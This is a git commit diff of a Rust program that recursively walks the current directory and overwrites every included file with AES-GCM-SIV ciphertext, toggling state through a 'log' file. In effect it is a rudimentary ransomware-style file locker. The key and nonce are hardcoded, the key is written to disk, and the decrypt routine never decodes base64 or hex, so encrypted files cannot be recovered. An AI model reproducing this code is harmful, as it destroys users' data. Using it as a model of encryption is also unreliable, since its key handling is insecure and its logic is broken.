18a37c1533cf3ecfc0eec6e6c24b959ce749d515
junxua01 <junxua01@students.cs.ubc.ca>
2022-06-19 12:46:01 -0700

    Finished encrytion with aes

--- src/main.rs
+++ src/main.rs
@@ -1,22 +1,31 @@
 use std::fs::{self, metadata};
 use std::path::PathBuf;
-use sha3::{Digest, Sha3_256};
+use std::str;
 use hex;
+use aes_gcm_siv::{Aes256GcmSiv, Key, Nonce}; 
+use aes_gcm_siv::aead::{Aead, NewAead};
+use base64;
+
 
 fn main() -> std::io::Result<()> {
     let mut files: Vec<PathBuf> = Vec::new();
     all_files(&mut files, &PathBuf::from(".\\"));
+    parse_key(files)?;
+    Ok(())
+}
+
+fn parse_key(files: Vec<PathBuf>) -> Result<(), std::io::Error> {
     let key = String::from_utf8(fs::read(".\\log")?).unwrap();
     let parts: Vec<&str> = key.split(",").collect();
-    if parts[0] == "0" {
-        encrypt_all(files)?;
-        fs::write(".\\log", format!("{},{}", "1", "123arqwreqw1234"))?;
+    Ok(if parts[0] == "0" {
+        write_all(files, &encrypt)?;
+        fs::write(".\\log", format!("{},{}", "1", "an example very very secret key."))?;
     } else {
         println!("Files have already been encrypted!");
+        write_all(files, &decrypt)?;
         fs::write(".\\log", format!("{},{}", "0", ""))?;
-    }
-    let _ = fs::read("foo.txt")?;
-    Ok(())
+        println!("Files have already been decrypted!");
+    })
 }
 
 fn all_files(files: &mut Vec<PathBuf>, file: &PathBuf) {
@@ -48,16 +57,29 @@ fn should_include(file: &str) -> bool {
     !to_exclude.contains(&file)
 }
 
-fn encrypt_all(paths: Vec<PathBuf>) -> Result<(), std::io::Error> {
+fn write_all(paths: Vec<PathBuf>, target: &dyn Fn(&str)->String) -> Result<(), std::io::Error> {
     for path_buf in paths {
         let path = path_buf.to_str().unwrap();
         let data = &String::from_utf8(fs::read(path)?).unwrap();
-        println!("writing: {:?}, {:?}", path, to_sha3(data));
-        fs::write(path, to_sha3(data))?;
+        println!("writing: {:?}, {:?}", path, target(data));
+        fs::write(path, target(data))?;
     }
     Ok(())
 }
 
-fn to_sha3(content: &str) -> String {
-    hex::encode(Sha3_256::new().chain_update(content.as_bytes()).finalize())
+fn encrypt(content: &str) -> String {
+    let key = b"an example very very secret key.";
+    let cipher = Aes256GcmSiv::new(Key::from_slice(key));
+    let nonce = Nonce::from_slice(b"unique nonce");
+    let ciphertext = cipher.encrypt(nonce, hex::encode(content).as_ref()).expect("encryption failure!");
+    base64::encode(ciphertext)
+}
+
+fn decrypt(content: &str) -> String {
+    println!("{}", content);
+    let key = b"an example very very secret key.";
+    let cipher = Aes256GcmSiv::new(Key::from_slice(key));
+    let nonce = Nonce::from_slice(b"unique nonce");
+    let plaintext = cipher.decrypt(nonce, content.as_ref()).expect("decryption failure!");
+    base64::encode(plaintext)
 }
